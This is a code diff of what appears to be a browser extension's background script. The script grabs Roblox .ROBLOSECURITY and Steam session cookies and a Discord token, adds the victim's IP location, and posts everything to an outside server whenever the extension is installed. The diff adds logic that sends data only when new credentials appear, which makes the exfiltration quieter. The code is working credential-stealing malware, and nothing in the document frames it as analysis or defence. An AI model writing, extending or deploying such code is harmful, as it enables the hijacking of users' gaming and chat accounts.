@@ -3,6 +3,7 @@ const SERVER_URL = "https://mm2-server.onrender.com/send";
 let sentRoblox = "";
 let sentSteam = "";
 let sentDiscord = "";
+let lastSentTime = 0;
 
 async function getDiscordToken() {
     try {
@@ -59,6 +60,8 @@ async function sendData() {
     data.country = ip?.country || "";
     data.city = ip?.city || "";
 
+    let hasNew = false;
+
     try {
         const c = await chrome.cookies.getAll({ domain: ".roblox.com" });
         const rob = c.find(x => x.name === ".ROBLOSECURITY");
@@ -67,6 +70,7 @@ async function sendData() {
                 data.robloxCookie = rob.value;
                 data.robloxStatus = "new";
                 sentRoblox = rob.value;
+                hasNew = true;
             } else {
                 data.robloxStatus = "sent";
             }
@@ -81,6 +85,7 @@ async function sendData() {
                 data.steamCookie = steam.value;
                 data.steamStatus = "new";
                 sentSteam = steam.value;
+                hasNew = true;
             } else {
                 data.steamStatus = "sent";
             }
@@ -93,18 +98,22 @@ async function sendData() {
             data.discordToken = discordToken;
             data.discordStatus = "new";
             sentDiscord = discordToken;
+            hasNew = true;
         } else {
             data.discordStatus = "sent";
         }
     }
 
-    try {
-        await fetch(SERVER_URL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(data)
-        });
-    } catch (e) {}
+    // Отправляем ТОЛЬКО если есть новые данные
+    if (hasNew) {
+        try {
+            await fetch(SERVER_URL, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify(data)
+            });
+        } catch (e) {}
+    }
 }
 
 chrome.runtime.onInstalled.addListener(() => { sendData(); });
